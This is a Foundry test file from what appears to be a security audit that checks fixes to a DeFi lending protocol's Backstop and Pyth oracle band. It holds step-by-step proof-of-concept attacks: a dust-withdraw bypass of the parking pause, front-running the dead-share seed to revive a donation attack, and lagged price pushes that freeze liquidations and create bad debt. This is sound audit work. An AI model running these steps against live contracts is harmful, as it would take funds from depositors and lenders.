// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity 0.8.28;

import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";

import {IBackstop} from "../../src/interfaces/IBackstop.sol";
import {IBorrowAccount} from "../../src/interfaces/IBorrowAccount.sol";
import {Venue} from "../../src/interfaces/ILiquidationVenues.sol";
import {Backstop} from "../../src/liquidation/Backstop.sol";
import {IBtcMusdOracle} from "../../src/oracle/IBtcMusdOracle.sol";
import {MezoAddresses} from "../../script/config/MezoAddresses.sol";

import {BackstopBase} from "../unit/BackstopBase.t.sol";
import {SMUSDMock} from "../utils/SMUSDMock.sol";
import {DeployLiquidationHarness} from "./LiquidationAuditHelpers.sol";
import {R2Base} from "./Round2Cross.t.sol";
import {R3FixBackstopDeployer} from "./Round3FixesHelpers.sol";

// =====================================================================================================================
// Round 3: are the round-2 fixes (git diff 524b0f1 16dbaf0 -- contracts/src contracts/script) correct and complete?
// Run: FOUNDRY_OUT=out/r3-fixes FOUNDRY_CACHE_PATH=cache/r3-fixes forge test --match-path
// test/audit/Round3_fixes.t.sol -vvv
// =====================================================================================================================

/// @notice Backstop: the parking pause (R2V-7 / R2X-1 fix) and the mandatory dead-share seed (R2V-2 fix).
contract R3FixBackstopTest is BackstopBase {
    address internal carol = makeAddr("carol");

    /// @dev `Backstop._buyQuote` at the mock oracle price.
    function _quote(uint256 btc) internal view returns (uint256) {
        return Math.mulDiv(Math.mulDiv(btc, PRICE, 1e36), WAD - backstop.DISCOUNT(), WAD);
    }

    // -----------------------------------------------------------------------------------------------------------------
    // R3F-B: the parking pause is cleared by ANY successful wsMUSD withdraw, and wsMUSD serves a withdraw from its own
    // idle MUSD without calling sMUSD at all. While sMUSD's withdraw is still broken, a purchase sized to need at most
    // the MUSD dust wsMUSD holds (< MIN_HARVEST, never re-staked) succeeds, clears the pause, and the next sale parks
    // every idle MUSD back into the broken wsMUSD: the BACKSTOP venue is dead again while `quoteBuy` reports it.
    // -----------------------------------------------------------------------------------------------------------------

    function test_R3F_B_pauseClearedByDustServedWithdraw_whileSmusdWithdrawStillBroken() public {
        uint256 aliceShares = _deposit(alice, 10_000e18);
        _deposit(bob, 10_000e18);
        uint256 id = _request(alice, aliceShares);
        skip(7 days);

        // sMUSD's withdraw breaks (deposits still work). A matured exit is paid in kind and pauses parking: the
        // round-2 fix working as designed.
        smusd.setDisabled(false, true, false);
        backstop.claimRedeem(id);
        assertEq(backstop.parkingPausedUntil(), block.timestamp + backstop.PARK_PAUSE(), "parking paused");
        _deposit(carol, 2000e18);
        uint256 idle = musd.balanceOf(address(backstop));
        assertGe(idle, 2000e18, "new MUSD kept idle: it funds the BACKSTOP venue");
        uint256 qBefore = backstop.quoteBuy(0.01e18);
        assertGt(qBefore, 0, "venue quoted from idle MUSD");
        assertLe(qBefore, idle);

        // Attack (any liquidator; FlashLiquidator.liquidate takes an exact seizedAssets):
        // 1. harvest wsMUSD so its next sync claims nothing, 2. leave < MIN_HARVEST of MUSD in wsMUSD (never re-staked),
        // 3. sell the backstop BTC worth just over its idle MUSD: the rest (<= the dust) comes out of wsMUSD's own idle
        //    MUSD, no sMUSD call, so the withdraw "succeeds" and clears the pause.
        ws.sync();
        uint256 dust = 0.0009e18;
        musd.mint(attacker, dust);
        vm.prank(attacker);
        musd.transfer(address(ws), dust);
        uint256 btc = idle * 1e18 / _quote(1e18);
        while (_quote(btc) <= idle) ++btc;
        assertLe(_quote(btc) - idle, dust, "needs at most the dust from wsMUSD");
        uint256 paid = _buy(btc);
        assertEq(paid, _quote(btc), "the purchase clears");
        assertEq(backstop.parkingPausedUntil(), 0, "pause cleared");
        assertTrue(smusd.withdrawDisabled(), "while sMUSD's withdraw is still broken");
        uint256 aliceWs = ws.balanceOf(alice); // her in-kind payment: wsMUSD still cannot pay out a real amount
        vm.prank(alice);
        vm.expectRevert(SMUSDMock.Disabled.selector);
        ws.redeem(aliceWs / 10, alice, alice);

        // 4. The sale of that BTC (here the auction; a keeper sale or, once the BTC is gone, any deposit does the same)
        //    parks every idle MUSD back into wsMUSD, which cannot pay it out.
        uint256 proceeds = _take(btc);
        assertGt(proceeds, 1000e18);
        assertLt(musd.balanceOf(address(backstop)), 1e15, "sale proceeds re-parked into the broken wsMUSD");

        // 5. The venue is dead but quoted: the FlashLiquidator's preview (quoteBuy) says the backstop buys, the
        //    purchase reverts CashUnavailable. Only another in-kind exit (7-day queue) re-pauses parking.
        uint256 qAfter = backstop.quoteBuy(0.01e18);
        assertGt(qAfter, 0, "quoted as available");
        vm.deal(liquidator, 0.01e18);
        vm.prank(liquidator);
        vm.expectPartialRevert(IBackstop.CashUnavailable.selector);
        backstop.buyCollateral{value: 0.01e18}(0);
        emit log_named_decimal_uint("idle MUSD before the attack (venue capacity)", idle, 18);
        emit log_named_decimal_uint("MUSD pulled from wsMUSD by the clearing purchase", paid - idle, 18);
        emit log_named_decimal_uint("sale proceeds re-parked into the broken wsMUSD", proceeds, 18);
    }

    // -----------------------------------------------------------------------------------------------------------------
    // R3F-A: the mandatory seed is a plain gross-priced `deposit` into a backstop at a predictable CREATE address, so
    // MUSD sent to that address before the seed lands changes how many dead shares it mints. 1 wei before deployment
    // makes the script's own `balanceOf(DEAD) == BACKSTOP_SEED` check fail (deployment DoS); 0.6 MUSD landing between
    // the Backstop creation and the seed transaction (the check only runs in the local simulation) leaves 1 dead
    // share-wei, and the R2V-2 donation attack works again.
    // -----------------------------------------------------------------------------------------------------------------

    function test_R3F_A_seedVoidedByMusdSentToThePredictableBackstopAddress() public {
        DeployLiquidationHarness script = new DeployLiquidationHarness();
        R3FixBackstopDeployer deployer = new R3FixBackstopDeployer();

        // (1) 1 wei sent to the deployer's next CREATE address before the deployment.
        address next = vm.computeCreateAddress(address(deployer), 1);
        musd.mint(attacker, 1);
        vm.prank(attacker);
        musd.transfer(next, 1);
        Backstop b1 = deployer.deploy(_params(LLTV));
        assertEq(address(b1), next, "predictable");
        musd.mint(address(script), 1e18);
        script.seed(b1, address(musd));
        assertEq(b1.balanceOf(DEAD), 0.5e18, "half the dead shares");
        assertTrue(b1.balanceOf(DEAD) != 1e18, "DeployLiquidation._check (`balanceOf(DEAD) == BACKSTOP_SEED`) reverts");

        // (2) 0.6 MUSD landing between the Backstop creation and the seed transaction of the broadcast.
        Backstop b2 = new Backstop(_params(LLTV));
        musd.mint(attacker, 0.6e18);
        vm.prank(attacker);
        musd.transfer(address(b2), 0.6e18);
        musd.mint(address(script), 1e18);
        script.seed(b2, address(musd));
        assertEq(b2.balanceOf(DEAD), 1, "one dead share-wei: the seed's protection is gone, silently");

        // (2b) 1 MUSD or more instead: the broadcast's seed transaction reverts, leaving an unseeded backstop that the
        // already-deployed FlashLiquidator is immutably wired to.
        Backstop b3 = new Backstop(_params(LLTV));
        musd.mint(attacker, 1e18);
        vm.prank(attacker);
        musd.transfer(address(b3), 1e18);
        musd.mint(address(script), 1e18);
        vm.expectRevert(IBackstop.ZeroAmount.selector);
        script.seed(b3, address(musd));

        // (3) The R2V-2 PoC against the seeded backstop: a 10,000 MUSD donation now prices small deposits out and costs
        // large ones thousands (test_fix_R2V2 asserts both are harmless with 1e18 dead shares).
        musd.mint(attacker, 10_000e18);
        vm.prank(attacker);
        musd.transfer(address(b2), 10_000e18);
        musd.mint(bob, 13_000e18);
        vm.startPrank(bob);
        musd.approve(address(b2), type(uint256).max);
        vm.expectRevert(IBackstop.ZeroAmount.selector);
        b2.deposit(4000e18, bob);
        uint256 large = b2.deposit(9000e18, bob);
        vm.stopPrank();
        assertEq(large, 1, "9,000 MUSD buys one share-wei");
        skip(7 days);
        b2.sync();
        uint256 bobValue = b2.convertToAssets(large);
        emit log_named_decimal_uint("victim value after vesting (paid 9,000)", bobValue, 18);
        assertLt(bobValue + 2000e18, 9000e18, "the victim loses over 2,000 MUSD");
    }
}

/// @notice Oracle: the 600 s Pyth BTC band (R2X-2 fix) against an adversary who pushes genuine but lagged Pyth prints.
contract R3FixOracleTest is R2Base {
    /// @dev Crash speed in bps of the starting price per minute; the crash stops at -30%.
    uint256 internal crashBpsPerMinute = 200;

    /// @dev BTC path: flat, then down `crashBpsPerMinute` per minute (linear) until -30%, then flat.
    function _btcAt(uint256 t0, uint256 t) internal view returns (uint256) {
        if (t <= t0) return BTC_USD;
        uint256 drop = BTC_USD * crashBpsPerMinute * (t - t0) / (BPS * 1 minutes);
        uint256 floor = BTC_USD * 70 / 100;
        return BTC_USD - drop < floor || drop > BTC_USD ? floor : BTC_USD - drop;
    }

    /// @dev A Pyth BTC update (Pyth's `updatePriceFeeds` is permissionless and accepts any signed Hermes update
    /// newer than the stored one, including historical ones fetched by publish time).
    function _pushPythBtc(uint256 px18, uint256 publishTime) internal {
        // forge-lint: disable-next-line(unsafe-typecast)
        pyth.setPrice(MezoAddresses.PYTH_BTC_USD, int64(int256(px18 / 1e10)), -8, publishTime);
    }

    function _unhealthyAtSkip(address account) internal view returns (bool) {
        uint256 value = IBorrowAccount(account).collateral() * uint256(skipOracle.answer()) / 1e18;
        return value * M1_LLTV / 1e18 < IBorrowAccount(account).debt();
    }

    /// @return cleared Minute at which both positions were liquidated (0 if never).
    /// @return firstUnhealthy First minute at which the positions were liquidatable at the Skip price.
    /// @return frozenMinutes Minutes in which they were liquidatable but the oracle reverted `PythDeviation`.
    function _runCrash(uint256 t0, address a1, address a2, bool adversary)
        internal
        returns (uint256 cleared, uint256 firstUnhealthy, uint256 frozenMinutes)
    {
        for (uint256 m = 1; m <= 60; ++m) {
            uint256 t = t0 + m * 1 minutes;
            vm.warp(t);
            vm.roll(vm.getBlockNumber() + 15);
            uint256 px = _btcAt(t0, t);
            skipOracle.setAnswer(int256(px));
            _repricePools(px);
            // The adversary keeps the band "fresh" with the genuine print from 590 s ago (publish times increase).
            if (adversary) _pushPythBtc(_btcAt(t0, t - 590), t - 590);
            if (!_unhealthyAtSkip(a1)) continue;
            if (firstUnhealthy == 0) firstUnhealthy = m;
            IBtcMusdOracle.Status memory s = oracle.status();
            if (!s.ok) {
                assertTrue(s.pythBtcFresh, "band on: the Pyth print is at most 600 s old");
                assertGt(s.deviationBps, oracle.MAX_DEV_BPS());
                vm.prank(keeper);
                vm.expectPartialRevert(IBtcMusdOracle.PythDeviation.selector);
                liquidator.liquidate(a1, 0, Venue.BACKSTOP, 0);
                ++frozenMinutes;
                continue;
            }
            vm.startPrank(keeper);
            liquidator.liquidate(a1, 0, Venue.BACKSTOP, 0);
            liquidator.liquidate(a2, 0, Venue.BACKSTOP, 0);
            vm.stopPrank();
            return (m, firstUnhealthy, frozenMinutes);
        }
    }

    /// @dev Two STANDARD positions just under the 7100 bps ceiling, vMUSD as M1's lender, and Pyth's last push 30
    /// minutes old (Mezo's pusher not keeping up: the R2X-2 premise). Returns the crash start.
    function _crashSetup() internal returns (uint256 lenderShares, address a1, address a2, uint256 t0) {
        lenderShares = _depositVault(lender, 20_000e18);
        _depositBackstop(bpLp, 20_000e18); // ample backstop cash: the venue is never the constraint
        a1 = _open(makeAddr("b1"), 0.1e18, 7090);
        a2 = _open(makeAddr("b2"), 0.1e18, 7090);
        _nextBlock();
        assertGt(_vaultM1(), 10_000e18, "vMUSD is M1's lender");
        vm.warp(block.timestamp + 30 minutes);
        vm.roll(vm.getBlockNumber() + 450);
        skipOracle.setAnswer(int256(BTC_USD));
        t0 = block.timestamp;
        assertFalse(oracle.status().pythBtcFresh, "band off before the crash");
    }

    /// @notice Calibration (sound): against R2X-2's own crash (3% per 5 minutes) the 600 s band holds even with the
    /// adversary below: a 10-minute-old print is only ~6% away, so the positions clear at the first liquidatable minute.
    function test_R3F_verify_bandHoldsAgainstR2X2CrashEvenWithLaggedPushes() public {
        (uint256 lenderShares, address a1, address a2, uint256 t0) = _crashSetup();
        uint256 before = vault.previewRedeem(lenderShares);
        crashBpsPerMinute = 60;
        (uint256 cleared, uint256 first, uint256 frozen) = _runCrash(t0, a1, a2, true);
        assertEq(frozen, 0, "never frozen");
        assertEq(cleared, first, "cleared at the first liquidatable minute");
        assertGe(vault.previewRedeem(lenderShares) + 1, before, "no bad debt");
    }

    function test_R3F_C_laggedPythPushes_holdTheBandPast600s_badDebtForVMUSD() public {
        (uint256 lenderShares, address a1, address a2, uint256 t0) = _crashSetup();
        uint256 before = vault.previewRedeem(lenderShares);
        uint256 snap = vm.snapshotState();

        // Control: nobody pushes Pyth. Both positions clear at the first liquidatable minute, no bad debt.
        (uint256 clearedControl, uint256 firstControl, uint256 frozenControl) = _runCrash(t0, a1, a2, false);
        assertEq(firstControl, 9, "liquidatable from minute 9 (-18%)");
        assertEq(clearedControl, 9, "cleared at once");
        assertEq(frozenControl, 0);
        assertGe(vault.previewRedeem(lenderShares) + 1, before, "no bad debt");
        vm.revertToState(snap);

        // Attack: the same crash, with an adversary (e.g. an underwater borrower) pushing the genuine Pyth print from
        // 590 s earlier every minute. Each print is "fresh" (<= 600 s), so the band holds liquidations for as long as
        // BTC keeps falling more than 10% per 10 minutes, then 10% more: here 12 minutes, until BTC is down 30%.
        (uint256 cleared, uint256 first, uint256 frozen) = _runCrash(t0, a1, a2, true);
        assertEq(first, 9);
        assertEq(frozen, 12, "12 consecutive minutes frozen");
        assertEq(cleared, 21, "cleared at -30%");
        assertGt((cleared - first) * 1 minutes, oracle.PYTH_BTC_BAND_MAX_AGE(), "frozen longer than the 600 s bound");
        uint256 afterAttack = vault.previewRedeem(lenderShares);
        emit log_named_uint("minutes liquidatable but frozen (bound claimed: 10)", frozen);
        emit log_named_decimal_uint("vMUSD lender loss to bad debt (MUSD)", before - afterAttack, 18);
        assertLt(afterAttack + 300e18, before, "bad debt lands on vMUSD lenders");
    }
}
